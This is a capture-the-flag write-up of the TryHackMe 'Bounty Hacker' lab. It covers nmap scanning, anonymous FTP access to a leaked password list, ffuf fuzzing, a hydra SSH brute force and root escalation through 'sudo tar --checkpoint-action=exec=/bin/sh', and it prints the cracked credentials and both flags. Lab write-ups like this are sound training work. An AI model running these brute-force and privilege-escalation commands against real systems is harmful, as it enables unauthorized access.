Lab: [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

Tools: 
 - **nmap**:  tool to find open ports, detect operating systems and discover potential vulnerabilities 
 - **ftp**: command-line tool that allows users to transfer files to or from a remote server using the FTP protocol.
 - **gowitness**: command line tool written in Go to capture and screenshot web pages
 - **ffuf**: web fuzzer written in Go to discover hidden or unlinked resources on a web server 
 -  **hydra**: online password-cracking tool for ftp, ssh, http and telnet services

After connecting to the network through TryHackMe's VPN. I want to make sure the target is reachable.
```
ping -c 5 10.10.74.157  
PING 10.10.137.182 (10.10.137.182) 56(84) bytes of data.
64 bytes from 10.10.74.157: icmp_seq=1 ttl=61 time=202 ms
64 bytes from 10.10.74.157: icmp_seq=2 ttl=61 time=190 ms
64 bytes from 10.10.74.157: icmp_seq=3 ttl=61 time=186 ms
64 bytes from 10.10.74.157: icmp_seq=4 ttl=61 time=222 ms
64 bytes from 10.10.74.157: icmp_seq=5 ttl=61 time=190 ms

--- 10.10.74.157 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4011ms
rtt min/avg/max/mdev = 185.976/198.154/222.401/13.315 ms

```
-----
**Host Enumeration**
After confirming that  I can reach the target. I run an nmap scan.


| Nmap Flags | Description |
|----------|----------|
| T5 |Fastest scanning speed | 
| SC | Runs default scripts |
| sV | Version detection on open ports | 
```
*nmap -T5 -sC -sV 10.10.74.157*
Starting Nmap 7.94SVN ( [https]://nmap.org ) at 2024-01-25 11:16 EST
Nmap scan report for 10.10.137.182
Host is up (0.20s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
**21/tcp open  ftp     vsftpd 3.0.3**
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.0.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
**| ftp-anon: Anonymous FTP login allowed (FTP code 230)**
|_Can't get directory listing: TIMEOUT
**22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)**
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
**80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))**
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at [https]://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.24 seconds

```
-----------
**FTP - Anonymous Login (Port  21)**
Anonymous login is enabled 
```
ftp 10.10.74.157 21 
Connected to 10.10.74.157.
220 (vsFTPd 3.0.3)
Name (10.10.137.182:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> prompt
Interactive mode off.
ftp> ls -alt
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
226 Directory send OK.
ftp> mget *
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |***********************************************************************************|   418        4.24 MiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (2.18 KiB/s)
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |***********************************************************************************|    68       12.69 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.33 KiB/s)

```
Contents of files from FTP directories

**task.txt**
```
cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

```
**locks.txt**
```
cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e

```

The user lin created a task list. Locks.txt is possibly a list of passwords that can be used to gain access through the ssh

-------
**Website Enumeration (Port 80)**

At the index of the web server on port 80, the following message can be viewed
![http-10 10 137 182-](https://github.com/paRaade/CTF-Writeups/assets/126734769/53225ff3-6e2b-4b48-a7be-9ddc506a1a5e)


```
ffuf -w directory-list-2.3-medium.txt:FUZZ -u http://10.10.74.157/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.74.157/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 208ms]
                        [Status: 200, Size: 969, Words: 135, Lines: 31, Duration: 187ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 186ms]
:: Progress: [220546/220546] :: Job [1/1] :: 203 req/sec :: Duration: [0:18:28] :: Errors: 0 ::
                                                                                                    
```
There isn't anything else to enumerate on port 80 other than the images directory.
![http-10 10 74 157-images-](https://github.com/paRaade/CTF-Writeups/assets/126734769/e9b8a85d-c7bd-4fc8-a98f-cb1d828ad185)

------


**SSH (Port 22)**
```
hydra -l lin -P locks.txt ssh://10.10.74.157 -V                                 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-25 13:22:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.74.157:22/
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "ReDdr4g0nSynd!cat3" - 2 of 26 [child 1] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "Dr@gOn$yn9icat3" - 3 of 26 [child 2] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "R3DDr46ONSYndIC@Te" - 4 of 26 [child 3] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "ReddRA60N" - 5 of 26 [child 4] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "R3dDrag0nSynd1c4te" - 6 of 26 [child 5] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "dRa6oN5YNDiCATE" - 7 of 26 [child 6] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "ReDDR4g0n5ynDIc4te" - 8 of 26 [child 7] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "R3Dr4gOn2044" - 9 of 26 [child 8] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 9] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "R3dDRaG0Nsynd1c@T3" - 11 of 26 [child 10] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "Synd1c4teDr@g0n" - 12 of 26 [child 11] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "reddRAg0N" - 13 of 26 [child 12] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "REddRaG0N5yNdIc47e" - 14 of 26 [child 13] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "Dra6oN$yndIC@t3" - 15 of 26 [child 14] (0/0)
[ATTEMPT] target 10.10.74.157 - login "lin" - pass "4L1mi6H71StHeB357" - 16 of 26 [child 15] (0/0)
[22][ssh] host: 10.10.74.157   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-25 13:22:23


```
```
The valid ssh credentials are:
username: lin
password: RedDr4gonSynd1cat3
```
After establishing an SSH connection to the web server, I then checked the contents of the Desktop directory and read the user flag.
```
ssh lin@10.10.74.157         
The authenticity of host '10.10.74.157 (10.10.74.157)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.74.157' (ED25519) to the list of known hosts.
lin@10.10.74.157's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ 

```

```
lin@bountyhacker:~/Desktop$ ls -alt
total 12
drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt
drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}

```
**Privilege Escalation**

In order to reach the root flag the first thing I did was run the following command. 
```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

```
Lin has root privileges to execute the /bin/tar command


I then went to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo) and searched for tar. GTFOBins describes itself as a curated list of Unix binaries that can be used to bypass local security restrictions in misconfiguration systems

Running the following command allowed me to get a root shell and read the root.txt flag located in the root directory
```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# ls /root
root.txt
# cat /root/root.txt
THM{80UN7Y_h4cK3r}

```
